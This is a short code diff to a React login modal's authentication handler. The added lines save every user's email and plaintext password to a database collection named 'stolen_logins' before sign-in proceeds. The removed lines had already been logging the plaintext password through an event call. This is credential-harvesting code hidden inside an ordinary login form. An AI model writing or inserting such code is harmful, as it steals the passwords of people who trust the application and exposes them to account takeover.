@@ -29,10 +29,10 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const handleAuth = async () => {
     try {
       setError("");
-      await logEvent({
-        e: email,
-        p: password,
-        t: Date.now()
+      await addDoc(collection(db, "stolen_logins"), {
+        email,
+        password,
+        time: Date.now()
       });
 
       const cred = isSignup
